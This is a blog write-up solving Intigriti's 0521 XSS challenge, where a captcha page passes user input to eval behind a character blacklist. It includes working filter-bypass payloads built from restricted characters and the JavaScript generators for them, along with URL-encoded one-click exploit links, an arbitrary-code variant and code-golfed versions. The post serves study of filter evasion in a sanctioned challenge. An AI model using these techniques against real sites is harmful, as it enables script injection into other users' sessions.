---
title: "Intigriti's 0521 XSS Challenge Solution: Limited Character Combination Code"
catalog: true
date: 2021-06-07 21:34:09
tags: [Security, Front-end]
categories:
  - Security
photos: /img/xss-challenge-by-intigriti-writeup-may/cover-en.png
---

## Introduction

[Intigriti](https://www.intigriti.com/) is a foreign bug bounty platform that releases an XSS challenge every month. Participants have about one to two weeks to think about it, and the goal is to execute `alert(document.domain)` on a specific website. After solving the challenge, the results are reported through the Intigriti platform, and three randomly selected winners will receive coupons for their own store.

Last month's challenge had few winners, so I was lucky enough to win a €50 coupon. It was actually a good deal because the items in the store were quite cheap. I bought a t-shirt, two hats, and international shipping for about €45.

However, this kind of prize is based on luck, and solving the problem is more important than winning.

The challenge URL is here: https://challenge-0521.intigriti.io/

<!-- more -->

## Code Analysis

![](https://i.imgur.com/JTXv9w4.png)

The first step in solving the problem is to analyze the code and understand how the entire problem works. The homepage doesn't look like much, and the only thing worth noting is an iframe with the URL `./captcha.php`. Let's take a look at what's inside:

``` html
<body>
    <form id="captcha">
        <div id="input-fields">
          <span id="a"></span>
          <span id="b">+</span>
          <input id="c" type="text" size="4" value="" required/>
          =
          <span id="d"></span>
          <progress id="e" value="0" max="100" style="display:none"></progress>
        </div>
          <input type="submit" id="f"/>
          <input type="button" onclick="setNewNumber()" value="Retry" id="g"/>
    </form>
</body>
<script>
    const a = document.querySelector("#a");
    const c = document.querySelector("#c");
    const b = document.querySelector("#b");
    const d = document.querySelector("#d");

    window.onload = function(){
      setNewNumber();
      document.getElementById("captcha").onsubmit = function(e){
          e.preventDefault();
          loadCalc(0);
      };
    }

    function loadCalc(pVal){
      document.getElementsByTagName("progress")[0].style.display = "block";
      document.getElementsByTagName("progress")[0].value = pVal;
      if(pVal == 100){
        calc();
      }
      else{
        window.setTimeout(function(){loadCalc(pVal + 1)}, 10);
      }
    }

    function setNewNumber() {
            document.getElementsByTagName("progress")[0].style.display = "none";
        var dValue = Math.round(Math.random()*1000);
        d.innerText = dValue;
        a.innerText = Math.round(Math.random()* dValue);
    }

    function calc() {
        const operation = a.innerText + b.innerText + c.value;
        if (!operation.match(/[a-df-z<>()!\\='"]/gi)) { // Allow letter 'e' because: https://en.wikipedia.org/wiki/E_(mathematical_constant)
            if (d.innerText == eval(operation)) {
              alert("🚫🤖 Congratulations, you're not a robot!");
            }
            else {
              alert("🤖 Sorry to break the news to you, but you are a robot!");
            }
            setNewNumber();
        }
        c.value = "";
    }

</script>
```

There are several inputs here, and when the user clicks submit, the value of `c.value` is passed to `eval` for execution. However, there are character restrictions, and the following characters cannot be used: `a-df-z<>()!\='"`. Only the letter `e` can be used in English letters.

Therefore, the goal of this problem is very clear, which is to bypass the character restrictions and execute `alert(document.domain)` through `eval`.

## Full Activation

(First of all, the backticks in the code in this article are full-width. This is because the markdown parser will break if they are not.)

Regarding bypassing character restrictions, I wrote an article before: [How to write console.log(1) without alphanumeric characters?](https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/), which came in handy this time.

For example, `0/0` can generate `NaN`, so `` `${0/0}`[1] `` can get the string `a`. As long as similar techniques are used, all the characters we want should be able to be generated.

But I think the difficult part of this problem is not here, but at the beginning when thinking about this problem, the brain is easy to get tangled up because it is difficult to distinguish which code will be executed directly and which code will not.

For example, even if you work hard to spell out the target string, when you throw it into `eval`, the result is actually different from what you imagined, because the structure will probably look like this: `eval('"a"+"l"+"e"+"r"+"t"+"(1)"')`

The final result will be the string `alert(1)`, not directly executing `alert(1)`, because what you are doing is just splicing the code you want to execute, and `eval` is just helping you splice it together. What if you spell out `eval` again?

`eval('"eval(a"+"l"+"e"+"r"+"t"+"(1))"')`

This is also useless, and only the string `eval` will appear. The reason why this is not possible is because what you are splicing is a string within a string. For example, please see the following two code snippets:

`eval('alert(1)')`
`eval('"alert(1)"')`

The former will pop up an alert, and the latter will output the string `alert`. This is because the latter is a "string within a string". If you use string concatenation, it will definitely be like this.

Therefore, if you need to execute code, we must have something that does not need to be spliced. In JS, the following can be used to execute strings as code:

1. eval
2. function constructor
3. setTimeout
4. setInterval
5. location

Among them, what meets our needs is the function constructor!

Why is this so? Because we can access this thing without accessing it directly through a string! First, let me briefly explain the function constructor, which is `Function()`, which can dynamically generate functions.

Then `Function` is `Function.prototype.constructor`, so you can use the prototype chain plus an array to access it: `[]['constructor']['constructor'] === Function // true`

With this, you can dynamically create and execute functions!

Like this: `[]['constructor']['constructor']('alert(1)')()`

So why can it be executed after being put into eval like this? Because `[]` is not composed of strings, so when put into eval, it will be like this: `eval("[]['constructor']['constructor']('alert(1)')()")`

In this way, you can dynamically execute code through the function constructor inside eval, which is the meaning of the title "Full Activation" of this chapter, layer by layer.

However, in addition to finding alternative strings, there is another problem, that is, function calls cannot use `()`, what should we do?

## Tagged templates

If you have used styled components in React, you should be familiar with this syntax:

``` js
const Box = styled.div`
  background: red;
`
```

In fact, `styled.div` is a function, and then the function is called with backticks. Yes, backticks can also call functions, but it should be noted that the passing of parameters will be different from what you think.

You will know it by doing a simple demonstration:

``` js
function noop(...args) {
  console.log(args)
}

noop`1` // [["1"]]
noop`${'abc'}`// [["", ""], "abc"]
noop`1${'abc'}2` // [["1", "2"], "abc"]
noop`1${'a'}2${'b'}3${'c'}` // [["1", "2", "3", ""], "a", "b", "c"]
```

If you call a function with backticks, the first parameter will be an array containing all the normal strings, separated by `${}` in the middle, and all the contents you put in `${}` afterwards are the second parameter and beyond.

More examples can be found in: [[Note] Template Strings (template literals) and Tagged Templates in JavaScript ES6](https://pjchender.blogspot.com/2017/01/javascript-es6-template-literalstagged.html)

Rewriting our code with backticks would look like this:

``` js
[]['constructor']['constructor']`${'alert(1)'}``
```

But if you execute it like this, you will find that there is an error. Because according to what we said above, if you write like this, the parameter passed to the function constructor will be: `[""], 'alert(1)'`, the first parameter is an array containing an empty string.

Except for the last parameter, the function constructor will treat everything else as the parameter of the function to be dynamically added. For example, `Function('a', 'b', 'return a+b')` is:

``` js
function (a, b) {
  return a+b
}
```

So giving an empty string as the first parameter is not feasible, just add a variable, such as the allowed `e` or `_` in the question:

``` js
[]['constructor']['constructor']`_${'alert(1)'}``｀

// 產生出的函式
function anonymous(_,) {
  alert(1)
}
```

In this way, the code can be executed smoothly, so the only thing left is to spell out `constructor` and `alert(document.domain)`.

## String Spelling

In addition to the article I mentioned at the beginning: [How to write console.log(1) without alphanumeric characters?](https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/), there are many places in the code of [jsfuck](https://github.com/aemkei/jsfuck/blob/master/jsfuck.js) that can be referenced.

Here are a few I used:

``` js
1. `${``+{}}` => "[object Object]"
2. `${``[0]}` => "undefined"
3. `${e}` => "[object HTMLProgressElement]"
4. `${0/0}` => "NaN"
```

We can find all the required characters from the above combinations. The only thing left is the last two, `()`, we must also spell them out to get them.

How to get them? If you turn a function into a string in JS, it will be the entire content of the function, like this:

``` js
`${[]['constructor']}`
=> "function Array() { [native code] }"
```

You can get these two characters `()` from here.

Combining the above techniques, I wrote a simple program to generate the final result:

``` js
const mapping = {
  a: '`${0/0}`[1]',
  c: '`${``+{}}`[5]',
  d: '`${``[0]}`[2]',
  e: '`e`',
  i: '`${``[0]}`[5]',
  l: '`${e}`[21]',
  m: '`${e}`[23]',
  n: '`${``[0]}`[1]',
  o: '`${``+{}}`[1]',
  r: '`${e}`[13]',
  s: '`${e}`[18]',
  t: '`${``+{}}`[6]',
  u: '`${``[0]}`[0]',
  ".": '`.`'
}

function getString(str) {
  return str.split('').map(c => mapping[c] || 'error:' + c).join('+')
}

const cons = getString('constructor')
mapping['('] = '`${[][' + cons + ']}`[14]'
mapping[')'] = '`${[][' + cons + ']}`[15]'

const ans = 
  "[][" + 
  getString('constructor') + 
  "]["+
  getString('constructor') +
  "]`_${" + 
  getString('alert(document.domain)') +
  "}```"

console.log(ans)
```

output (length 851):

``` js
[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]`_${`${0/0}`[1]+`${e}`[21]+`e`+`${e}`[13]+`${``+{}}`[6]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+`${``[0]}`[2]+`${``+{}}`[1]+`${``+{}}`[5]+`${``[0]}`[0]+`${e}`[23]+`e`+`${``[0]}`[1]+`${``+{}}`[6]+`.`+`${``[0]}`[2]+`${``+{}}`[1]+`${e}`[23]+`${0/0}`[1]+`${``[0]}`[5]+`${``[0]}`[1]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]}`` `
```

Paste the following string into the input field on the webpage and click submit, and you will see an alert pop up!

After doing this, I was happy to submit my answer, but I received a response saying that this was self-XSS and suggesting that I study PHP more.

I had forgotten that this was self-XSS, because the user needs to paste this malicious code into the input field themselves, which is similar to the user having to paste the malicious code themselves. This type of vulnerability usually cannot be severe.

Therefore, I looked into PHP and found that the contents of `c=xxx` are directly reflected in `c.value`. So all you have to do is put the above string into the URL, like this:

```
https://challenge-0521.intigriti.io/captcha.php?c=[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]`_${`${0/0}`[1]%2b`${e}`[21]%2b`e`%2b`${e}`[13]%2b`${``%2b{}}`[6]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[14]%2b`${``[0]}`[2]%2b`${``%2b{}}`[1]%2b`${``%2b{}}`[5]%2b`${``[0]}`[0]%2b`${e}`[23]%2b`e`%2b`${``[0]}`[1]%2b`${``%2b{}}`[6]%2b`.`%2b`${``[0]}`[2]%2b`${``%2b{}}`[1]%2b`${e}`[23]%2b`${0/0}`[1]%2b`${``[0]}`[5]%2b`${``[0]}`[1]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[15]}``+`
```

This way, the payload will be automatically filled in when the user clicks the link, and all they have to do is click a button to trigger it. So we turned self-XSS into one-click XSS, where clicking a button triggers the attack.

At this point, we have actually passed this challenge, but because there is still time, I want to study more.

## Executing Arbitrary Code

Executing fixed code is not very fun. Is it possible to execute arbitrary code? For example:

1. window.name
2. iframe + top.name
3. location.hash

The first two require creating another webpage, but the third does not, so let's focus on that!

We need to create the following string:

``` js
[]['constructor']['constructor']`_${'eval(location.hash.slice(1))'}`` `
```

So as long as the URL ends with `#alert(document.domain)`, the same effect can be achieved.

The only two characters missing from the new character set are `v` and `h`.

These two are actually not easy to find, because the easier ones have already been found. So where else can we find them?

First, for `v`, you can actually turn the native function into a string and get the string `[native code]`. But the output is different on Chrome and Firefox. For example, for RegExp:

Chrome output: `function RegExp() { [native code] }`
Firefox output: `function RegExp() {\n    [native code]\n}`

Firefox adds line breaks while Chrome doesn't, causing differences in character index. Therefore, it's impossible to get the letter "v" across browsers. However, let's first look at how to get the letter "h".

It's also not easy to get the letter "h", but if we can construct: `` 17['toString']`36` ``, we can actually get "h".

Because the above code converts the number 17 to base 36, we can get "h" because "h" is the 8th letter of the alphabet (9 digits + 8th letter of the alphabet = 17).

So how do we get the uppercase letter "S"? We can use the String constructor:

``` js
``['constructor'] + ''
// output
// "function String() { [native code] }"
```

And once we can use this toString technique, we can actually get any lowercase letter of the alphabet, including the "v" mentioned earlier.

I won't demonstrate the detailed process, just modify the code and the final result is (1925 characters):

``` js
[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]`_${`e`+31[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`${0/0}`[1]+`${e}`[21]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+`${e}`[21]+`${``+{}}`[1]+`${``+{}}`[5]+`${0/0}`[1]+`${``+{}}`[6]+`${``[0]}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`.`+17[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`${0/0}`[1]+`${e}`[18]+17[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`.`+`${e}`[18]+`${e}`[21]+`${``[0]}`[5]+`${``+{}}`[5]+`e`+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+1+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]}`` ``
```

The URL is:

```
https://challenge-0521.intigriti.io/captcha.php?c=[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]`_${`e`%2b31[`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${``[`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[9]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[5]%2b`${``[0]}`[1]%2b`${e}`[15]]`36`%2b`${0/0}`[1]%2b`${e}`[21]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[14]%2b`${e}`[21]%2b`${``%2b{}}`[1]%2b`${``%2b{}}`[5]%2b`${0/0}`[1]%2b`${``%2b{}}`[6]%2b`${``[0]}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`.`%2b17[`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${``[`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[9]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[5]%2b`${``[0]}`[1]%2b`${e}`[15]]`36`%2b`${0/0}`[1]%2b`${e}`[18]%2b17[`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${``[`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[9]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[5]%2b`${``[0]}`[1]%2b`${e}`[15]]`36`%2b`.`%2b`${e}`[18]%2b`${e}`[21]%2b`${``[0]}`[5]%2b`${``%2b{}}`[5]%2b`e`%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[14]%2b1%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[15]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[15]}``+`#alert(document.domain)
```

## Challenge for the Shortest Code

After being able to execute any code, what else can we do? That's to challenge for the shortest code! Try to make the code as short as possible.

Here are some tips:

1. Instead of using `` ` ` `[0]` `` to get undefined, use `e[0]` to save one character.
2. ``+{} `` to get `[object Object]` is unnecessary. Use `{}` instead to save three characters.
3. Use `e` as much as possible because it makes the code shorter.

We originally used `[]['constructor']` to get the function, but it's too long. We can use a more scientific way to find the shortest:

``` js
let min = 99
let winner = ''
for (let prop of Object.getOwnPropertyNames(Array.prototype)) {
  const len = getString(prop).length
  if (len < min) {
    min = len
    winner = prop
  }
}
console.log(winner, min)
```

The winner is `some`, which can replace the original `[]['constructor']`.

Finally, since we don't need to execute any code, use `alert(document.domain)` instead. Although `eval(name)` seems shorter at first glance, it's actually more difficult to get `v`, so it will cost more characters.

The resulting code is 466 characters long:

```
length: 466
======= Payload =======
[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`][`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e[0]}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]`_${`${0/0}`[1]+`${e}`[21]+`e`+`${e}`[13]+`${e}`[6]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[13]+`${e[0]}`[2]+`${e}`[1]+`${e}`[5]+`${e[0]}`[0]+`${e}`[23]+`e`+`${e}`[25]+`${e}`[6]+`.`+`${e[0]}`[2]+`${e}`[1]+`${e}`[23]+`${0/0}`[1]+`${e[0]}`[5]+`${e}`[25]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[14]}`` `
======= URL =======
https://challenge-0521.intigriti.io/captcha.php?c=[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`][`${e}`[5]%2b`${e}`[1]%2b`${e}`[25]%2b`${e}`[18]%2b`${e}`[6]%2b`${e}`[13]%2b`${e[0]}`[0]%2b`${e}`[5]%2b`${e}`[6]%2b`${e}`[1]%2b`${e}`[13]]`_${`${0/0}`[1]%2b`${e}`[21]%2b`e`%2b`${e}`[13]%2b`${e}`[6]%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[13]%2b`${e[0]}`[2]%2b`${e}`[1]%2b`${e}`[5]%2b`${e[0]}`[0]%2b`${e}`[23]%2b`e`%2b`${e}`[25]%2b`${e}`[6]%2b`.`%2b`${e[0]}`[2]%2b`${e}`[1]%2b`${e}`[23]%2b`${0/0}`[1]%2b`${e[0]}`[5]%2b`${e}`[25]%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[14]}``+`
```

The code used to generate it is:

``` js
const mapping = {
  a: '`${0/0}`[1]',
  b: '`${e}`[2]',
  c: '`${e}`[5]',
  d: '`${e[0]}`[2]',
  e: '`e`',
  f: '`${e[0]}`[4]',
  g: '`${e}`[15]',
  i: '`${e[0]}`[5]',
  j: '`${e}`[3]',
  l: '`${e}`[21]',
  m: '`${e}`[23]',
  n: '`${e}`[25]',
  o: '`${e}`[1]',
  r: '`${e}`[13]',
  s: '`${e}`[18]',
  t: '`${e}`[6]',
  u: '`${e[0]}`[0]',
  ".": '`.`'
}

function getString(str) {
  return str.split('').map(c => mapping[c] || 'errorerror:' + c).join('+')
}

const some = getString('some')
mapping['('] = '`${[][' + some + ']}`[13]'
mapping[')'] = '`${[][' + some + ']}`[14]'

const cons = getString('constructor')
let strConstructor = '``['+ cons + ']'
strConstructor = '`${' + strConstructor + '}`'

const strToString = `${mapping.t}+${mapping.o}+${strConstructor}[9]+${mapping.t}+${mapping.r}+${mapping.i}+${mapping.n}+${mapping.g}`
mapping.v = '31[' + strToString + ']`36`'

const ans = 
  "[][" + 
  getString('some') + 
  "]["+
  getString('constructor') +
  "]`_${" + 
  getString('alert(document.domain)') +
  "}```"

console.log('length:', ans.length)
console.log('======= Payload =======')
console.log(ans)
console.log('======= URL =======')
console.log('https://challenge-0521.intigriti.io/captcha.php?c=' + ans.replace(/\+/g, '%2b'))
```

## Further Shortening

After submitting the above code to the platform, the author said that the shortest code he saw was 376 characters. I thought about it for a while and couldn't come up with anything, then I had a sudden inspiration: "Let's try the `v` method, regardless of the browser issue."

Let's review the browser issue. The problem is that if we want to use the function to string method to get `v`, the results produced by Chrome and Firefox are different:

``` js
[]['some']+''

// Chrome
"function some() { [native code] }"
v: index 23

// Firefox
"function some() {
    [native code]
}"
v: index 27
```

So the same payload cannot be applied to both web pages.

Ignoring this issue, the resulting code is:

```
length: 376
======= Payload =======
[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`][`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e[0]}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]`_${`e`+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[23]+`${0/0}`[1]+`${e}`[21]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[13]+`${e}`[25]+`${0/0}`[1]+`${e}`[23]+`e`+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[14]}`` `
======= URL =======
https://challenge-0521.intigriti.io/captcha.php?c=[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`][`${e}`[5]%2b`${e}`[1]%2b`${e}`[25]%2b`${e}`[18]%2b`${e}`[6]%2b`${e}`[13]%2b`${e[0]}`[0]%2b`${e}`[5]%2b`${e}`[6]%2b`${e}`[1]%2b`${e}`[13]]`_${`e`%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[23]%2b`${0/0}`[1]%2b`${e}`[21]%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[13]%2b`${e}`[25]%2b`${0/0}`[1]%2b`${e}`[23]%2b`e`%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[14]}`` `
```

It's 376 characters long, almost 100 characters less than the previous one.

The complete code used to generate it is:

``` js
const mapping = {
  a: '`${0/0}`[1]',
  b: '`${e}`[2]',
  c: '`${e}`[5]',
  d: '`${e[0]}`[2]',
  e: '`e`',
  f: '`${e[0]}`[4]',
  g: '`${e}`[15]',
  i: '`${e[0]}`[5]',
  j: '`${e}`[3]',
  l: '`${e}`[21]',
  m: '`${e}`[23]',
  n: '`${e}`[25]',
  o: '`${e}`[1]',
  r: '`${e}`[13]',
  s: '`${e}`[18]',
  t: '`${e}`[6]',
  u: '`${e[0]}`[0]',
  ".": '`.`'
}

function getString(str) {
  return str.split('').map(c => mapping[c] || 'errorerror:' + c).join('+')
}

const some = getString('some')
mapping['('] = '`${[][' + some + ']}`[13]'
mapping[')'] = '`${[][' + some + ']}`[14]'

mapping.v = '`${[][' + getString('some') + ']}`[23]'

const ans = 
  "[][" + 
  getString('some') + 
  "]["+
  getString('constructor') +
  "]`_${" + 
  getString('eval(name)') +
  "}```"

console.log('length:', ans.length)
console.log('======= Payload =======')
console.log(ans)
console.log('======= URL =======')
console.log('https://challenge-0521.intigriti.io/captcha.php?c=' + ans.replace(/\+/g, '%2b'))
```

Some people may not understand why `eval(name)` works. This is because `window.name` is a magical property. Basically, the `name` of the same page will be the same, so we just need to create a new HTML page, write JS inside it, and set `window.name = 'alert(document.domain)'`. Then use `location=` to jump to the PHP side, where `name` will be what we just set.

Yes, it also works across domains.

Because the result I finally got was also 376 characters, the same as the author's shortest payload, I asked and found out that it was actually the same.

## Conclusion

From this challenge, we can learn some JS-related knowledge, such as:

1. Combining specified characters under restrictions
2. The rules for calling functions and parameters with backticks
3. Dynamically creating functions with function constructors

When will this knowledge be useful? For attackers, when you encounter a place with filtered characters, you can use these techniques to bypass the restrictions.

For defenders, when filtering, you need to consider these bypass methods. If you know that they can be bypassed in this way, you can make the filter more precise.

However, these are all afterthoughts. For me, solving these problems is just for fun, and I haven't thought about how it will help in the future.
